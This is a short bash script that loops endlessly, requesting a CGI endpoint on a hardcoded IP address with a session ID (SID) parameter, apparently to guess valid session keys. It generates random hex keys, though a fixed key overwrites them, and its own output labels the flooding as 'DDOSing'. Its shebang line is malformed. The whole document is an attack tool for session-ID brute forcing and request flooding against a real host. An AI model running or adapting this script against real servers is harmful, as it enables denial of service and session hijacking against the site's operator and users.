#3!/bin/bash/
#for i in `seq 1 16`;
while true
do
	key=$(shuf -e 0 1 2 3 4 5 6 7 8 9 a b c d e f)
	key=$(echo $key | tr -d ' ')
	key="204b7c1bb5f214a3"
	url="http://93.175.29.65/cgi-bin/new-client?SID=$key"
	echo $url
	out=$(links -dump $url)
	echo $out
	if [[ $out == *"Error"* ]]
	then echo DDOSing...
	else echo "Success! SID=$key"
	fi
done
